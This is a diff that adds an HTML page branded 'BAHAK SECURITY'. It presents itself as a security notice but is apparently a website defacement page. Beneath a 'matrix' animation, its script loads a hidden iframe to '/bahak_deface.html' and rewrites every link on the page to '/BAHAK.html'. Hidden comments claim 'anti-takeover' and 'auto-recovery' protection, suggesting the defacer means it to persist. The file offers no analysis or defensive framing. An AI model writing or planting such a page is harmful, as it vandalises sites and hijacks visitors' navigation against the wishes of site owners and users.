@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BAHAK SECURITY</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; }
+        .container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; }
+        h1 { font-size: 48px; text-shadow: 0 0 10px #0f0; animation: glow 2s infinite alternate; }
+        @keyframes glow { from { text-shadow: 0 0 10px #0f0; } to { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; } }
+        p { font-size: 20px; margin: 20px 0; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>BAHAK SECURITY</h1>
+        <p>System Secured by BAHAK Framework</p>
+        <p>Protected by Advanced Security Protocol</p>
+        <div class="hidden">
+            <!-- BAHAK PROTECTION ACTIVE -->
+            <!-- AUTO-RECOVERY SYSTEM ENABLED -->
+            <!-- ANTI-TAKEOVER: ENABLED -->
+        </div>
+    </div>
+    <script>
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        document.body.appendChild(canvas);
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        canvas.style.position = 'fixed';
+        canvas.style.top = '0';
+        canvas.style.left = '0';
+        canvas.style.zIndex = '-1';
+        const chars = "01";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            for(let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 35);
+        const iframe = document.createElement('iframe');
+        iframe.src = 'http://' + window.location.host + '/bahak_deface.html';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        document.querySelectorAll('a').forEach(link => {
+            link.href = 'http://' + window.location.host + '/BAHAK.html';
+        });
+    </script>
+</body>
+</html>
